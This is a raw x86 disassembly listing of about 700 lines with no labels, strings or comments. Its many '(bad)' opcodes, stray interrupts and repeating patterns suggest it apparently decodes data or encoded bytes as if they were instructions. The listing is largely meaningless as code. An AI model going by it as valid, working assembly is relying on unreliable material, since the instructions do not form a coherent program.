  423b74:	sub    BYTE PTR [ebx+0x13],dl
  423b77:	jno    0x423b79
  423b79:	(bad)  
  423b7a:	jne    0x423b7c
  423b7c:	jo     0x423b9a
  423b7e:	int    0x76
  423b80:	lods   eax,DWORD PTR ds:[esi]
  423b81:	or     dh,BYTE PTR [esi+0x75]
  423b84:	int    0x76
  423b86:	cmp    eax,0xecfd760a
  423b8b:	cmp    BYTE PTR [ebx],bh
  423b8d:	or     al,0x3b
  423b8f:	cdq    
  423b90:	shr    ebx,cl
  423b92:	xchg   edx,eax
  423b93:	shr    edx,cl
  423b95:	sub    BYTE PTR [ebx+0x13],dl
  423b98:	jno    0x423b67
  423b9a:	lea    esi,[ebp+0x3bb596cd]
  423ba0:	or     al,0x3b
  423ba2:	cdq    
  423ba3:	shr    ebx,cl
  423ba5:	xchg   edx,eax
  423ba6:	shr    edx,cl
  423ba8:	sub    BYTE PTR [ebx+0x13],dl
  423bab:	jno    0x423bad
  423bad:	(bad)  
  423bae:	lods   eax,DWORD PTR ds:[esi]
  423baf:	add    BYTE PTR [eax+0x1c],dh
  423bb2:	int    0x76
  423bb4:	std    
  423bb5:	or     dh,BYTE PTR [esi+0x1d]
  423bb8:	int    0x76
  423bba:	jne    0x423bc6
  423bbc:	out    0x55,al
  423bbe:	or     dh,BYTE PTR [esi-0x30]
  423bc1:	leave  
  423bc2:	jbe    0x423b61
  423bc4:	inc    ecx
  423bc5:	and    DWORD PTR [esi+0x5576cd35],eax
  423bcb:	int    0x8d
  423bcd:	push   ebp
  423bce:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bd1:	or     al,0xd3
  423bd3:	lods   eax,DWORD PTR ds:[esi]
  423bd4:	sub    bl,dl
  423bd6:	jmp    0x423b6a
  423bd8:	push   ebx
  423bd9:	ror    DWORD PTR [edx],cl
  423bdb:	jbe    0x423c22
  423bdd:	int    0x76
  423bdf:	push   ebp
  423be0:	int    0x8d
  423be2:	push   ebp
  423be3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be6:	or     al,0xd3
  423be8:	lods   eax,DWORD PTR ds:[esi]
  423be9:	sub    bl,dl
  423beb:	jmp    0x423b7f
  423bed:	push   ebx
  423bee:	ror    DWORD PTR [edx],cl
  423bf0:	jbe    0x423bff
  423bf2:	leave  
  423bf3:	jbe    0x423b8a
  423bf5:	dec    eax
  423bf6:	and    DWORD PTR [esi-0x528936cb],eax
  423bfc:	ret    0x8621
  423bff:	xor    eax,0xcd5576cd
  423c04:	lea    edx,[ebp+0x3b]
  423c07:	jns    0x423c44
  423c09:	or     al,0xd3
  423c0b:	jmp    0x423b9f
  423c0d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c13:	lea    ebx,ds:0x52f7d43
  423c19:	push   ss
  423c1a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423c20:	add    BYTE PTR [eax-0x326a7233],0x76
  423c27:	xchg   ebp,eax
  423c28:	int    0x96
  423c2a:	inc    ebp
  423c2b:	cmp    eax,ebp
  423c2d:	cmp    ecx,DWORD PTR [edi]
  423c2f:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c35:	push   ebx
  423c36:	jge    0x423c05
  423c38:	jbe    0x423c57
  423c3a:	xor    edx,edx
  423c3c:	cmp    ebx,edx
  423c3e:	clc    
  423c3f:	add    cl,BYTE PTR [edx]
  423c41:	jbe    0x423c50
  423c43:	int    0x76
  423c45:	lods   eax,DWORD PTR ds:[esi]
  423c46:	int    0x8d
  423c48:	lods   eax,DWORD PTR ds:[esi]
  423c49:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c4c:	or     al,0xd3
  423c4e:	jmp    0x423be2
  423c50:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c56:	lea    ecx,ds:0x16d87d43
  423c5c:	int    0x76
  423c5e:	lods   eax,DWORD PTR ds:[esi]
  423c5f:	int    0x8d
  423c61:	lods   eax,DWORD PTR ds:[esi]
  423c62:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c65:	or     al,0xd3
  423c67:	lods   eax,DWORD PTR ds:[esi]
  423c68:	sub    bl,dl
  423c6a:	jmp    0x423bfe
  423c6c:	push   ebx
  423c6d:	ror    DWORD PTR [edx],cl
  423c6f:	jbe    0x423c7e
  423c71:	int    0x76
  423c73:	xchg   ebp,eax
  423c74:	int    0x8d
  423c76:	xchg   ebp,eax
  423c77:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c7a:	or     al,0xd3
  423c7c:	lods   eax,DWORD PTR ds:[esi]
  423c7d:	sub    bl,dl
  423c7f:	jmp    0x423c13
  423c81:	push   ebx
  423c82:	ror    ebp,cl
  423c84:	lea    ecx,ds:0xad3d12f
  423c8a:	jbe    0x423c99
  423c8c:	int    0x76
  423c8e:	push   ebp
  423c8f:	int    0x8d
  423c91:	push   ebp
  423c92:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c95:	or     al,0xd3
  423c97:	jmp    0x423c2b
  423c99:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c9f:	lea    ecx,ds:0x52f7d43
  423ca5:	pusha  
  423ca6:	xchg   edx,eax
  423ca7:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423cae:	or     eax,0x874576cd
  423cb3:	jbe    0x423c85
  423cb5:	or     ah,dh
  423cb7:	cmp    eax,0x5d5d760a
  423cbc:	inc    ecx
  423cbd:	and    DWORD PTR [esi+0x6d760a35],eax
  423cc3:	leave  
  423cc4:	jbe    0x423d2b
  423cc6:	cmp    DWORD PTR [ecx],esp
  423cc8:	xchg   BYTE PTR ds:0xb22576c9,dh
  423cce:	and    DWORD PTR [esi-0xe89f5cb],eax
  423cd4:	int    0x76
  423cd6:	cmp    eax,0x3b3d8dcd
  423cdb:	jns    0x423d18
  423cdd:	or     al,0xd3
  423cdf:	lods   eax,DWORD PTR ds:[esi]
  423ce0:	sub    bl,dl
  423ce2:	jmp    0x423c76
  423ce4:	push   ebx
  423ce5:	ror    DWORD PTR [edx],cl
  423ce7:	jbe    0x423d66
  423ce9:	int    0x6d
  423ceb:	jmp    0x423cf3
  423ced:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cf7:	add    BYTE PTR [ebx],cl
  423cf9:	and    DWORD PTR [esi-0x369232cb],eax
  423cff:	push   es
  423d00:	jl     0x423d02
  423d02:	add    BYTE PTR [eax],al
  423d04:	mul    DWORD PTR [ecx]
  423d06:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423d0c:	int    0x76
  423d0e:	icebp  
  423d0f:	int    0x8d
  423d11:	icebp  
  423d12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d15:	or     al,0xd3
  423d17:	lods   eax,DWORD PTR ds:[esi]
  423d18:	sub    bl,dl
  423d1a:	jmp    0x423cae
  423d1c:	push   ebx
  423d1d:	ror    ebp,cl
  423d1f:	lea    edi,[ebp+0x2f]
  423d22:	rcl    ebx,1
  423d24:	int    0x8d
  423d26:	pop    ebp
  423d27:	retf   0x8884
  423d2a:	or     DWORD PTR [esi-0x1f],esi
  423d2d:	int    0x6d
  423d2f:	int    0x76
  423d31:	icebp  
  423d32:	int    0x8d
  423d34:	icebp  
  423d35:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d38:	jns    0x423d0d
  423d3a:	jmp    0x423cce
  423d3c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d42:	lea    edi,[ebp+0x2f]
  423d45:	rcl    ebx,1
  423d47:	int    0x8d
  423d49:	gs int 0x96
  423d4c:	cmp    ecx,DWORD PTR gs:[edi]
  423d4f:	cmp    edx,ebp
  423d51:	shl    edx,cl
  423d53:	sub    bl,dl
  423d55:	repz xchg edx,eax
  423d57:	push   ebx
  423d58:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d5e:	das    
  423d5f:	pop    ecx
  423d60:	dec    esp
  423d61:	mov    ch,cl
  423d63:	push   es
  423d64:	mov    WORD PTR [eax],es
  423d66:	add    BYTE PTR [eax],al
  423d68:	int    0x17
  423d6a:	mov    WORD PTR [eax],es
  423d6c:	add    BYTE PTR [eax],al
  423d6e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d71:	aad    0xd3
  423d73:	lods   eax,DWORD PTR ds:[esi]
  423d74:	sub    bl,dl
  423d76:	repz xchg edx,eax
  423d78:	push   ebx
  423d79:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d7f:	loope  0x423dbc
  423d81:	jge    0x423d8c
  423d83:	(bad)  
  423d84:	loope  0x423d53
  423d86:	ins    DWORD PTR es:[edi],dx
  423d87:	retf   0xe176
  423d8a:	int    0x8d
  423d8c:	icebp  
  423d8d:	int    0x96
  423d8f:	icebp  
  423d90:	cmp    ecx,DWORD PTR [edi]
  423d92:	cmp    edx,ebp
  423d94:	shl    ebx,cl
  423d96:	xchg   edx,eax
  423d97:	shl    edx,cl
  423d99:	sub    BYTE PTR [ebx+0x13],dl
  423d9c:	int    0x96
  423d9e:	jge    0x423dcf
  423da0:	rcl    DWORD PTR [ebx],1
  423da2:	int    0x96
  423da4:	pop    ebp
  423da5:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dac:	icebp  
  423dad:	int    0x8d
  423daf:	icebp  
  423db0:	cmp    edi,DWORD PTR [ecx+0x3b]
  423db3:	or     al,0xd3
  423db5:	lods   eax,DWORD PTR ds:[esi]
  423db6:	sub    bl,dl
  423db8:	jmp    0x423d4c
  423dba:	push   ebx
  423dbb:	ror    ebp,cl
  423dbd:	lea    edi,[ebp+0x2f]
  423dc0:	rcl    ebx,1
  423dc2:	int    0x8d
  423dc4:	pop    ebp
  423dc5:	retf   0x8884
  423dc8:	or     DWORD PTR [esi-0x1f],esi
  423dcb:	int    0x6d
  423dcd:	int    0x76
  423dcf:	icebp  
  423dd0:	int    0x8d
  423dd2:	icebp  
  423dd3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423dd6:	lods   eax,DWORD PTR ds:[esi]
  423dd7:	sub    BYTE PTR [ebx],bh
  423dd9:	or     al,0xd3
  423ddb:	jmp    0x423d6f
  423ddd:	push   ebx
  423dde:	ror    ebp,cl
  423de0:	lea    edi,[ebp+0x2f]
  423de3:	rcl    ebx,1
  423de5:	int    0x8d
  423de7:	ins    DWORD PTR es:[edi],dx
  423de8:	int    0x96
  423dea:	ins    DWORD PTR es:[edi],dx
  423deb:	cmp    ecx,DWORD PTR [edi]
  423ded:	cmp    edx,ebp
  423def:	shl    edx,cl
  423df1:	sub    bl,dl
  423df3:	repz xchg edx,eax
  423df5:	push   ebx
  423df6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dfc:	das    
  423dfd:	pop    ecx
  423dfe:	dec    esp
  423dff:	mov    ch,cl
  423e01:	push   es
  423e02:	jl     0x423e04
  423e04:	add    BYTE PTR [eax],al
  423e06:	int    0x17
  423e08:	jl     0x423e0a
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e0f:	aad    0xd3
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	sub    bl,dl
  423e14:	repz xchg edx,eax
  423e16:	push   ebx
  423e17:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423e1d:	loope  0x423e5a
  423e1f:	jge    0x423e2a
  423e21:	(bad)  
  423e22:	loope  0x423df1
  423e24:	ins    DWORD PTR es:[edi],dx
  423e25:	retf   0xe176
  423e28:	int    0x8d
  423e2a:	icebp  
  423e2b:	int    0x96
  423e2d:	icebp  
  423e2e:	cmp    ecx,DWORD PTR [edi]
  423e30:	cmp    edx,ebp
  423e32:	shl    ebx,cl
  423e34:	xchg   edx,eax
  423e35:	shl    edx,cl
  423e37:	sub    BYTE PTR [ebx+0x13],dl
  423e3a:	int    0x96
  423e3c:	jge    0x423e6d
  423e3e:	rcl    DWORD PTR [ebx],1
  423e40:	int    0x96
  423e42:	pop    ebp
  423e43:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e4a:	and    eax,0x3b258dcd
  423e4f:	or     al,0x3b
  423e51:	jns    0x423e26
  423e53:	jmp    0x423de7
  423e55:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e5b:	lea    ebp,[ebp-0x33]
  423e5e:	xchg   esi,eax
  423e5f:	ins    DWORD PTR es:[edi],dx
  423e60:	cmp    ecx,DWORD PTR [edi]
  423e62:	cmp    edx,ebp
  423e64:	shl    edx,cl
  423e66:	sub    bl,dl
  423e68:	repz xchg edx,eax
  423e6a:	push   ebx
  423e6b:	adc    ebp,DWORD PTR [edi]
  423e6d:	rcl    ebx,1
  423e6f:	xchg   DWORD PTR [esi+0x7d],esi
  423e72:	or     dh,BYTE PTR [esi+0x7d]
  423e75:	int    0x76
  423e77:	jge    0x423e46
  423e79:	lea    ecx,ds:0xb2f7d43
  423e7f:	(bad)  
  423e80:	inc    DWORD PTR [eax]
  423e82:	add    ch,cl
  423e84:	jbe    0x423ef3
  423e86:	int    0x8d
  423e88:	ins    DWORD PTR es:[edi],dx
  423e89:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e8c:	jmp    0x423e20
  423e8e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e91:	lods   eax,DWORD PTR ds:[esi]
  423e92:	sub    BYTE PTR [ebx-0x2d],dl
  423e95:	int    0x8d
  423e97:	or     eax,0xcdd3d12f
  423e9c:	lea    edi,ds:0xf2d30f3b
  423ea2:	sub    BYTE PTR [ebx-0x2d],dl
  423ea5:	int    0x8d
  423ea7:	cmp    eax,0xebd30c3b
  423eac:	xchg   edx,eax
  423ead:	push   ebx
  423eae:	ror    DWORD PTR [edx],cl
  423eb0:	jbe    0x423f17
  423eb2:	int    0x76
  423eb4:	popf   
  423eb5:	int    0x8d
  423eb7:	popf   
  423eb8:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423ebb:	jmp    0x423e4f
  423ebd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ec0:	lods   eax,DWORD PTR ds:[esi]
  423ec1:	sub    BYTE PTR [ebx-0x2d],dl
  423ec4:	int    0x8d
  423ec6:	popf   
  423ec7:	int    0x96
  423ec9:	popf   
  423eca:	cmp    ecx,DWORD PTR [edi]
  423ecc:	shl    edx,cl
  423ece:	sub    BYTE PTR [ebx],bh
  423ed0:	aad    0xd3
  423ed2:	repz xchg edx,eax
  423ed4:	push   ebx
  423ed5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423edb:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423ee1:	in     al,dx
  423ee2:	sbb    al,0xcd
  423ee4:	jbe    0x423e83
  423ee6:	int    0x8d
  423ee8:	popf   
  423ee9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eec:	or     al,0xd3
  423eee:	lods   eax,DWORD PTR ds:[esi]
  423eef:	sub    bl,dl
  423ef1:	jmp    0x423e85
  423ef3:	push   ebx
  423ef4:	rol    DWORD PTR [edi+0x760a4576],cl
  423efa:	inc    ebp
  423efb:	int    0x76
  423efd:	popf   
  423efe:	int    0x8d
  423f00:	popf   
  423f01:	cmp    edi,DWORD PTR [ecx-0x2d]
  423f04:	lods   eax,DWORD PTR ds:[esi]
  423f05:	sub    BYTE PTR [ebx],bh
  423f07:	or     al,0xd3
  423f09:	jmp    0x423e9d
  423f0b:	push   ebx
  423f0c:	ror    ebp,cl
  423f0e:	lea    ebx,ds:0x76cd7d33
  423f14:	popf   
  423f15:	int    0x96
  423f17:	popf   
  423f18:	cmp    edi,DWORD PTR [ecx+0x3b]
  423f1b:	aad    0xd3
  423f1d:	repz xchg edx,eax
  423f1f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423f25:	xchg   esi,eax
  423f26:	inc    ebp
  423f27:	das    
  423f28:	rcl    edx,1
  423f2a:	inc    ebx
  423f2b:	shr    DWORD PTR [edi],cl
  423f2d:	pop    es
  423f2e:	adc    ebp,edi
  423f30:	add    BYTE PTR [eax],al
  423f32:	int    0x76
  423f34:	mov    BYTE PTR [eax],al
  423f36:	(bad)  
  423f37:	dec    esp
  423f38:	iret   
  423f39:	jbe    0x423ef8
  423f3b:	add    dh,dl
  423f3d:	mov    BYTE PTR [eax-0x33],dh
  423f40:	jbe    0x423eca
  423f42:	int    0x1
  423f44:	xchg   ebp,eax
  423f45:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f4f:	icebp  
  423f50:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f5a:	jne    0x423f19
  423f5c:	test   al,0x88
  423f5e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f65:	stc    
  423f66:	int    0x8d
  423f68:	stc    
  423f69:	cmp    eax,ebp
  423f6b:	cmp    ecx,DWORD PTR [edi]
  423f6d:	shl    edx,cl
  423f6f:	sub    bl,dl
  423f71:	mov    ebp,0xcdd35392
  423f76:	lea    esi,[ebp+0x43]
  423f79:	rcl    esp,cl
  423f7b:	push   esi
  423f7c:	int    0x76
  423f7e:	mov    ch,cl
  423f80:	lea    ebp,ds:0xcd2d96cd
  423f86:	add    DWORD PTR [ecx],edx
  423f88:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f92:	shr    edx,cl
  423f94:	sub    BYTE PTR [ebx+0x13],dl
  423f97:	jno    0x423f66
  423f99:	(bad)  
  423f9a:	stc    
  423f9b:	int    0x96
  423f9d:	stc    
  423f9e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423fa1:	cdq    
  423fa2:	shr    ebx,cl
  423fa4:	xchg   edx,eax
  423fa5:	shr    edx,cl
  423fa7:	sub    BYTE PTR [ebx+0x13],dl
  423faa:	jno    0x423fac
  423fac:	(bad)  
  423fad:	jne    0x423faf
  423faf:	jo     0x423fcd
  423fb1:	stos   BYTE PTR es:[edi],al
  423fb2:	test   al,0x63
  423fb4:	retf   
  423fb5:	ror    BYTE PTR [eax-0x12326980],cl
  423fbb:	add    al,0xed
  423fbd:	and    al,0x98
  423fbf:	int    0x11
  423fc1:	int    0x12
  423fc3:	sub    eax,0x4808081
  423fc8:	pop    esp
  423fc9:	sub    BYTE PTR [edi],0x5
  423fcc:	dec    edx
  423fcd:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423fd7:	add    BYTE PTR [esi],0xf7
  423fda:	das    
  423fdb:	add    eax,0x80808003
  423fe0:	int    0x7
  423fe2:	or     DWORD PTR [eax+0x6d068080],eax
  423fe8:	das    
  423fe9:	add    eax,0x808080e9
  423fee:	add    al,0x69
  423ff0:	int3   
  423ff1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423ff8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fff:	add    eax,0x808080e3
  424004:	int    0xc1
  424006:	and    eax,0x4808081
  42400b:	mov    dh,0x11
  42400d:	or     ch,0x13
  424010:	xor    ecx,DWORD PTR [esi-0x79]
  424013:	shr    BYTE PTR [edi],cl
  424015:	mov    ebx,0x8d0a4c70
  42401a:	mov    ch,0x2f
  42401c:	mov    ebx,0x13874e7c
  424021:	das    
  424022:	add    eax,0x80808049
  424027:	iret   
  424028:	jl     0x42403e
  42402a:	pop    ebx
  42402b:	or     cl,BYTE PTR [ebp+0x69bd]
  424031:	add    BYTE PTR [ebx-0x2baef966],al
  424037:	or     ebp,0x31
  42403a:	add    al,0xb6
  42403c:	cmc    
  42403d:	sub    BYTE PTR [ebx],0x99
  424040:	xchg   ecx,esi
  424042:	das    
  424043:	mov    ebx,0xbb2f4ee0
  424048:	mov    al,ds:0xd4fc874c
  42404d:	mov    esi,0xa148acf
  424052:	(bad)  
  424053:	in     eax,dx
  424054:	push   es
  424055:	push   ecx
  424056:	aam    0x6e
  424058:	int    0x89
  42405a:	add    al,0xb6
  42405c:	stc    
  42405d:	sub    BYTE PTR [ebx],0xf
  424060:	xchg   DWORD PTR [ebp+0x2f],edi
  424063:	mov    ebx,0xbb2f4ede
  424068:	sahf   
  424069:	dec    esp
  42406a:	xchg   esp,edi
  42406c:	aam    0x33
  42406e:	iret   
  42406f:	ficom  WORD PTR [edx+ecx*1]
  424072:	out    0xfd,al
  424074:	int    0xe6
  424076:	std    
  424077:	int    0x6a
  424079:	push   es
  42407a:	add    ah,dl
  42407c:	xchg   ch,cl
  42407e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42407f:	mov    ch,0x81
  424081:	and    al,0x8b
  424083:	das    
  424084:	mov    ebx,0xbb2f4ede
  424089:	sahf   
  42408a:	dec    esp
  42408b:	add    BYTE PTR [esi-0x7],dh
  42408e:	add    al,0x76
  424090:	std    
  424091:	mov    BYTE PTR [edi-0x619a104],al
  424097:	sbb    ch,0x2f
  42409a:	mov    ebx,0xbb2f4ee0
  42409f:	mov    al,ds:0xed8dcd4c
  4240a4:	add    BYTE PTR [esi-0xb],dh
  4240a7:	add    al,0xd3
  4240a9:	mov    BYTE PTR [edi-0x1272f504],al
  4240af:	pop    esi
  4240b0:	out    0xf5,al
  4240b2:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  4240b9:	jo     0x424109
  4240bb:	das    
  4240bc:	mov    ebx,0x76004cdc
  4240c1:	adc    DWORD PTR [ebx+edx*8],eax
  4240c4:	mov    BYTE PTR [edi-0x4272f527],al
  4240ca:	pop    esi
  4240cb:	xchg   esi,eax
  4240cc:	adc    DWORD PTR [edi],ebp
  4240ce:	or     ebp,DWORD PTR [esi-0x56000000]
  4240d4:	arpl   WORD PTR [ebx],di
  4240d6:	ins    DWORD PTR es:[edi],dx
  4240d7:	ins    BYTE PTR es:[edi],dx
  4240d8:	in     al,dx
  4240d9:	xchg   edx,eax
  4240da:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240dd:	retf   
  4240de:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240e4:	sub    eax,0xcd808081
  4240e9:	jbe    0x424137
  4240eb:	add    al,0xed
  4240ed:	xor    BYTE PTR [ebx+0x3b],bl
  4240f0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240f6:	add    eax,0x8080800b
  4240fb:	inc    ebx
  4240fc:	(bad)
  4240ff:	pop    esi
  424100:	pushf  
  424101:	(bad)  
  424103:	test   DWORD PTR [ebx],edi
  424105:	ins    DWORD PTR es:[edi],dx
  424106:	ins    BYTE PTR es:[edi],dx
  424107:	in     al,dx
  424108:	fmul   st,st(5)
  42410a:	ins    BYTE PTR es:[edi],dx
  42410b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424111:	and    al,0xcd
  424113:	jo     0x424149
  424115:	int    0x90
  424117:	adc    al,0xcd
  424119:	fcomp  QWORD PTR [edi+eax*4]
  42411c:	lea    ecx,[eax+0xa889687]
  424122:	(bad)  
  424123:	std    
  424124:	inc    ebx
  424125:	clc    
  424126:	jnp    0x4240af
  424128:	or     ah,dh
  42412a:	std    
  42412b:	or     ah,BYTE PTR [esi-0x259a107]
  424131:	fsub   st,st(3)
  424133:	inc    ebx
  424134:	pushf  
  424135:	adc    al,0x77
  424137:	xchg   BYTE PTR [edi],ch
  424139:	mov    ebx,0x92eca054
  42413e:	int    0xf4
  424140:	iret   
  424141:	push   esp
  424142:	ror    ebp,0x68
  424145:	push   es
  424146:	add    ah,dl
  424148:	ds xchg esi,esp
  42414b:	mov    BYTE PTR [edx],cl
  42414d:	out    0x11,al
  42414f:	inc    ebx
  424150:	stc    
  424151:	fdiv   DWORD PTR [eax]
  424153:	int    0xa6
  424155:	dec    esp
  424156:	int    0x63
  424158:	in     al,0x87
  42415a:	popf   
  42415b:	inc    ebx
  42415c:	cld    
  42415d:	ja     0x4240e3
  42415f:	int    0x58
  424161:	in     al,dx
  424162:	mov    BYTE PTR [ebx],dh
  424164:	out    0x88,al
  424166:	or     ch,BYTE PTR [eax-0x33]
  424169:	(bad)  
  42416a:	adc    DWORD PTR [esi],eax
  42416c:	not    esp
  42416e:	dec    esi
  42416f:	int    0xa6
  424171:	stc    
  424172:	dec    ebx
  424173:	or     ah,BYTE PTR [esi-0x259bc07]
  424179:	sbb    BYTE PTR [ebp-0x14],0x8
  42417d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424180:	test   al,0x63
  424182:	retf   
  424183:	ror    BYTE PTR [eax-0x12326980],cl
  424189:	add    al,0xed
  42418b:	push   eax
  42418c:	pop    ebx
  42418d:	cwde   
  42418e:	pop    ebp
  42418f:	dec    ecx
  424190:	and    DWORD PTR [esi-0x289f5cb],eax
  424196:	leave  
  424197:	jbe    0x424192
  424199:	inc    ecx
  42419a:	and    DWORD PTR [esi-0x27232cb],eax
  4241a0:	int    0xa6
  4241a2:	std    
  4241a3:	call   0x3b81:0x90cfffc0
  4241aa:	psrlq  mm5,mm3
  4241ad:	xchg   edx,eax
  4241ae:	stos   BYTE PTR es:[edi],al
  4241af:	cmp    esp,ecx
  4241b1:	shl    ebp,cl
  4241b3:	sub    BYTE PTR [ebx+0xc],dl
  4241b6:	or     cl,BYTE PTR [ebp-0x2723243]
  4241bc:	int    0x8d
  4241be:	std    
  4241bf:	int    0x8d
  4241c1:	std    
  4241c2:	int    0x8d
  4241c4:	std    
  4241c5:	int    0x8d
  4241c7:	std    
  4241c8:	int    0x8d
  4241ca:	std    
  4241cb:	int    0x8d
  4241cd:	std    
  4241ce:	int    0x8d
  4241d0:	std    
  4241d1:	int    0x8d
  4241d3:	std    
  4241d4:	int    0x8d
  4241d6:	std    
  4241d7:	leave  
  4241d8:	jbe    0x4241eb
  4241da:	fadd   st,st(5)
  4241dc:	loope  0x424233
  4241de:	int    0x8d
  4241e0:	std    
  4241e1:	int    0xa6
  4241e3:	std    
  4241e4:	cmp    esp,ecx
  4241e6:	cmp    ecx,DWORD PTR [edi]
  4241e8:	shl    ebp,cl
  4241ea:	sub    bl,dl
  4241ec:	jmp    0x424180
  4241ee:	push   ebx
  4241ef:	or     al,0xcd
  4241f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241f2:	dec    esp
  4241f3:	int    0x9f
  4241f5:	sub    eax,0x43808081
  4241fa:	push   ebx
  4241fb:	das    
  4241fc:	add    eax,0x80808717
  424201:	int    0x8d
  424203:	std    
  424204:	int    0xa6
  424206:	std    
  424207:	cmp    ecx,DWORD PTR [edi]
  424209:	cmp    esp,ecx
  42420b:	shr    ebx,cl
  42420d:	xchg   edx,eax
  42420e:	shl    ebp,cl
  424210:	sub    BYTE PTR [ebx+0xc],dl
  424213:	inc    ebx
  424214:	adc    ebp,DWORD PTR [edi]
  424216:	add    eax,0x8080877f
  42421b:	int    0xca
  42421d:	add    DWORD PTR [eax-0x69327f80],eax
  424223:	std    
  424224:	int    0xa6
  424226:	std    
  424227:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  42422d:	xchg   edx,eax
  42422e:	shl    ebp,cl
  424230:	sub    BYTE PTR [ebx-0x2b],dl
  424233:	inc    ebx
  424234:	adc    ebp,DWORD PTR [edi]
  424236:	add    eax,0x8080875b
  42423b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424241:	int    0xf1
  424243:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424249:	shl    ebx,cl
  42424b:	xchg   edx,eax
  42424c:	shl    ebp,cl
  42424e:	sub    BYTE PTR [ebx-0x2b],dl
  424251:	or     dl,BYTE PTR [esi+0x1196cd11]
  424257:	inc    ebx
  424258:	icebp  
  424259:	aam    0x26
  42425b:	int    0x76
  42425d:	std    
  42425e:	int    0x96
  424260:	std    
  424261:	cmp    ebx,ecx
  424263:	cmp    edi,DWORD PTR [ecx-0x2d]
  424266:	jmp    0xd253:0x92bdd328
  42426d:	int    0x96
  42426f:	adc    DWORD PTR [ebx-0x26],esi
  424272:	adc    al,0x5e
  424274:	test   BYTE PTR [edx-0x2a],cl
  424277:	xor    cl,ch
  424279:	jbe    0x424278
  42427b:	int    0x96
  42427d:	std    
  42427e:	cmp    ebx,ecx
  424280:	cmp    edi,DWORD PTR [ecx-0x2d]
  424283:	jmp    0xd253:0x92bdd328
  42428a:	int    0x96
  42428c:	adc    DWORD PTR [ebx-0x26],esi
  42428f:	adc    al,0x5e
  424291:	je     0x4242dd
  424293:	xor    BYTE PTR [edi],ch
  424295:	add    eax,0x808092df
  42429a:	int    0x76
  42429c:	std    
  42429d:	int    0x76
  42429f:	std    
  4242a0:	int    0xa6
  4242a2:	std    
  4242a3:	int    0x76
  4242a5:	std    
  4242a6:	cmp    ecx,ecx
  4242a8:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  4242ae:	in     al,dx
  4242af:	xchg   edx,eax
  4242b0:	push   ebx
  4242b1:	popf   
  4242b2:	int    0x76
  4242b4:	adc    DWORD PTR [ebx+0x6d],esi
  4242b7:	adc    al,0x87
  4242b9:	ror    ebp,cl
  4242bb:	jl     0x4242ed
  4242bd:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  4242c3:	int    0x8d
  4242c5:	std    
  4242c6:	int    0x96
  4242c8:	std    
  4242c9:	cmp    ecx,DWORD PTR [edi]
  4242cb:	cmp    ebx,ecx
  4242cd:	shr    ebx,cl
  4242cf:	xchg   edx,eax
  4242d0:	shr    edx,cl
  4242d2:	sub    BYTE PTR [ebx+0x13],dl
  4242d5:	int    0x96
  4242d7:	std    
  4242d8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242de:	lea    esi,[ebp+0x3bfd8dcd]
  4242e4:	cdq    
  4242e5:	cmp    esi,eax
  4242e7:	shl    edx,cl
  4242e9:	sub    bl,dl
  4242eb:	repz xchg edx,eax
  4242ed:	push   ebx
  4242ee:	jecxz  0x4242bd
  4242f0:	lea    esi,[ebp-0x792becbd]
  4242f6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242fc:	int    0x8d
  4242fe:	std    
  4242ff:	int    0x96
  424301:	std    
